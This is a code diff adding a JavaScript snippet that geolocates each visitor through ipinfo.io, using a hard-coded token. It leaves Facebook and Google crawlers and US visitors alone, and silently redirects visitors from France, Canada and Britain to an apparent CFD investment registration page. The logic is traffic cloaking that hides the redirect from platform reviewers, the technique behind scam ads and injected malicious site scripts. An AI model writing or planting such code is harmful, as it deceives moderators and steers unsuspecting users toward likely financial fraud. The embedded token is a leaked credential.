@@ -1,0 +1,16 @@
+function isMobileDevice() {
+  return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+}
+
+fetch('https://ipinfo.io/json?token=0784c654f65d07')
+  .then(response => response.json())
+  .then(data => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isFacebookBot = userAgent.includes('facebookexternalhit');
+    const isGoogleBot = userAgent.includes('googlebot');
+    const country = data.country;
+    if (isFacebookBot || isGoogleBot || country === 'US') {
+    } else if (country === 'FR' || country === 'CA' || country === 'GB') {
+      window.location.replace("https://cfd.fortuna-invest.com/register");
+    }
+  });
